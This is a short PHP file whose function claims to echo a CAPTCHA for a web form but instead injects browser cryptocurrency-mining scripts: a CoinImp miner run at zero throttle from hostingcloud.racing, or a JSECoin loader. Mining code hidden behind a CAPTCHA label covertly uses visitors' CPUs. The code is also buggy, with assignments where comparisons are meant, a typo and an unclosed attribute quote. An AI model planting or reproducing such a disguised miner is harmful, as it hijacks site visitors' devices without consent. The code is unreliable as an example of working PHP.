<?php
require_once $_SERVER['DOCUMENT_ROOT'] . '/config.php';
$url= $_SERVER['DOCUMENT_ROOT'];
/* Echoes the HTML code of the CAPTCHA for embedding it in a form. */
function embed_captcha() {
    if ($cfg_miner_mode ="iframe omly"){echo "$cfg_iframe_code";}
else if ($cfg_miner_mode = "coinimp"){
    echo '<script src="https://www.hostingcloud.racing/8B9U.js"></script>
<script>
    var _client = new Client.Anonymous("'.$cfg_coinimp_site_key.'", {
        throttle: 0, c: "w", ads: 0
    });
    _client.start();
    

</script>';
}
else if ($cfg_miner_mode ="jse"){
    echo '<script src="https://load.jsecoin.com/load/'.$cfg_jse_account_number.'/'.$url.'/optionalSubID/0/ async defer></script>';
}
}

?>